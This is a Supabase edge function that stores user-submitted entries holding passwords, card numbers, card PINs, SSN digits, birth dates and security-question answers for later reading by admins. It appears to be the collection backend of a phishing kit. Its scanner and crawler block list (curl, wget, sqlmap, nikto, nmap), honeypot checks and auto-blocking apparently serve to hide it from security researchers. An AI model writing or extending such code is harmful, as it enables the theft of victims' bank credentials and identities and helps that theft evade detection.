// redeploy 1779944431
// redeploy: 1779943933
// redeploy: 1779946460
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'
import { encrypt } from '../_shared/crypto.ts'
import { makeCorsHeaders } from '../_shared/cors.ts'
import { isPreviewRequest } from '../_shared/preview.ts'

const ENCRYPTED_PAYLOAD_KEYS = ['password', 'cardNumber', 'pinCard', 'ssnLast4', 'dob'] as const

const textOrNull = (value: unknown) => {
  const text = typeof value === 'string' ? value : ''
  return text.length > 0 ? text : null
}

let _req: Request | null = null
const json = (body: Record<string, unknown>, status = 200) =>
  new Response(JSON.stringify(body), {
    status,
    headers: { ...(_req ? makeCorsHeaders(_req) : {}), 'Content-Type': 'application/json' },
  })

const BOT_UA_RE = /(curl|wget|python-requests|httpie|libwww|scrapy|bot\b|crawler|spider|nikto|sqlmap|nmap|masscan|postmanruntime|insomnia|go-http-client|java\/|okhttp)/i

// In-memory rate limit: max 60 requests per IP per 60s window
const RL_MAX = 60
const RL_WINDOW_MS = 60_000
const rlHits = new Map<string, { count: number; resetAt: number }>()
function rateLimit(ip: string): { ok: boolean; retryAfter?: number } {
  const now = Date.now()
  const entry = rlHits.get(ip)
  if (!entry || entry.resetAt < now) {
    rlHits.set(ip, { count: 1, resetAt: now + RL_WINDOW_MS })
    // opportunistic GC
    if (rlHits.size > 5000) {
      for (const [k, v] of rlHits) if (v.resetAt < now) rlHits.delete(k)
    }
    return { ok: true }
  }
  entry.count++
  if (entry.count > RL_MAX) {
    return { ok: false, retryAfter: Math.ceil((entry.resetAt - now) / 1000) }
  }
  return { ok: true }
}

Deno.serve(async (req) => {
  _req = req
  if (req.method === 'OPTIONS') return new Response('ok', { headers: makeCorsHeaders(req) })
  if (req.method !== 'POST') return json({ ok: false, error: 'method_not_allowed' }, 405)

  const ip =
    req.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
    req.headers.get('cf-connecting-ip') ||
    'unknown'
  const userAgent = req.headers.get('user-agent') || ''

  // Hard cap on payload size — no legitimate entry exceeds 20KB
  const cl = Number(req.headers.get('content-length') ?? '0')
  if (cl > 20_000) return json({ ok: false, error: 'payload_too_large' }, 413)

  // Per-IP rate limit (60/min) — protects against flood
  const rl = rateLimit(ip)
  if (!rl.ok) {
    return new Response(JSON.stringify({ ok: false, error: 'rate_limited' }), {
      status: 429,
      headers: { ...makeCorsHeaders(req), 'Content-Type': 'application/json', 'Retry-After': String(rl.retryAfter ?? 60) },
    })
  }

  try {
    const supabaseUrl = Deno.env.get('SUPABASE_URL')
    const serviceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')
    if (!supabaseUrl || !serviceKey) return json({ ok: false, error: 'not_configured' }, 500)

    const sb = createClient(supabaseUrl, serviceKey, { auth: { persistSession: false } })

    // Reject blocked IPs — bypassed for Lovable preview origins.
    if (!isPreviewRequest(req)) {
      try {
        const { data: blocked } = await sb.rpc('is_ip_blocked', { _ip: ip })
        if (blocked === true) {
          try {
            await sb.rpc('record_security_event', {
              _ip: ip, _event_type: 'blocked_request',
              _user_agent: userAgent.slice(0, 300), _details: { path: 'save-user-entry' } as any,
            })
          } catch {}
          return json({ ok: false, error: 'blocked' }, 403)
        }
      } catch { /* fail-open on infra error */ }
    }

    // DB-backed rate limit (60/min/IP) — works across all replicas, persists
    try {
      const { data: rlDb } = await sb.rpc('rl_check_save', { _ip: ip, _max: 60, _window_seconds: 60 })
      if (rlDb && (rlDb as any).ok === false) {
        return new Response(JSON.stringify({ ok: false, error: 'rate_limited' }), {
          status: 429,
          headers: { ...makeCorsHeaders(req), 'Content-Type': 'application/json', 'Retry-After': String((rlDb as any).retry_after ?? 60) },
        })
      }
    } catch { /* fail-open if RPC infra hiccups */ }

    // Bot/scanner detection — record event (which can auto-block on repeated hits)
    if (userAgent && BOT_UA_RE.test(userAgent)) {
      try {
        await sb.rpc('record_security_event', {
          _ip: ip, _event_type: 'bot_user_agent',
          _user_agent: userAgent.slice(0, 300), _details: { path: 'save-user-entry' } as any,
        })
      } catch {}
      return json({ ok: false, error: 'forbidden' }, 403)
    }

    const payload = await req.json()

    // ─── Anti-bot signal check (honeypot / time-to-fill / activity) ───
    const antiBot = (payload && typeof payload === 'object') ? (payload as any)._ab : null
    if (antiBot) {
      const hp = typeof antiBot.hp === 'string' ? antiBot.hp.trim() : ''
      const fa = Number(antiBot.fa ?? 0)
      const act = Number(antiBot.act ?? 0)
      const reasons: string[] = []
      if (hp.length > 0) reasons.push('honeypot_filled')
      if (fa > 0 && fa < 1500) reasons.push('too_fast')
      if (act === 0) reasons.push('no_activity')
      if (reasons.length > 0) {
        try {
          await sb.rpc('record_security_event', {
            _ip: ip, _event_type: 'bot_signal',
            _user_agent: userAgent.slice(0, 300),
            _details: { path: 'save-user-entry', reasons, fa, act } as any,
          })
          await sb.rpc('block_ip', { _ip: ip, _reason: 'auto: bot signal (' + reasons.join(',') + ')', _admin: 'system', _user_agent: userAgent.slice(0, 300) }).catch(() => {})
        } catch {}
        return json({ ok: false, error: 'forbidden' }, 403)
      }
      // strip from payload before storage
      delete (payload as any)._ab
    }

    const id = textOrNull(payload.id)
    if (!id || !/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(id)) {
      try {
        await sb.rpc('record_security_event', {
          _ip: ip, _event_type: 'invalid_payload',
          _user_agent: userAgent.slice(0, 300), _details: { path: 'save-user-entry', reason: 'bad_id' } as any,
        })
      } catch {}
      return json({ ok: false, error: 'invalid_id' }, 400)
    }


    // Encrypt sensitive PII at rest. If DATA_ENCRYPTION_KEY is missing the
    // encrypt() helper passes the value through unchanged — fail-safe.
    for (const k of ENCRYPTED_PAYLOAD_KEYS) {
      if (typeof payload[k] === 'string' && payload[k].length > 0) {
        payload[k] = await encrypt(payload[k])
      }
    }
    if (Array.isArray(payload.challengeQuestions)) {
      payload.challengeQuestions = await Promise.all(
        payload.challengeQuestions.map(async (q: any) => ({
          question: q?.question ?? '',
          answer: q?.answer ? await encrypt(String(q.answer)) : '',
        })),
      )
    }

    // Atomic save (insert-or-update in single statement, race-free at high concurrency)
    const { error } = await sb.rpc('save_user_entry_atomic', { _payload: payload })
    if (error) throw error

    // Ensure the encryption marker is visible immediately for admin readers.
    const { error: markEncryptedError } = await sb.from('user_entries').update({ is_encrypted: true }).eq('id', id)
    if (markEncryptedError) throw markEncryptedError

    // Probabilistic cleanup (~1% chance) — keeps live tables small without cron
    sb.rpc('cleanup_live_maybe').then(() => {}, () => {})

    return json({ ok: true })
  } catch (error) {
    console.error('save-user-entry failed', error)
    return json({ ok: false, error: 'save_failed' }, 500)
  }
})
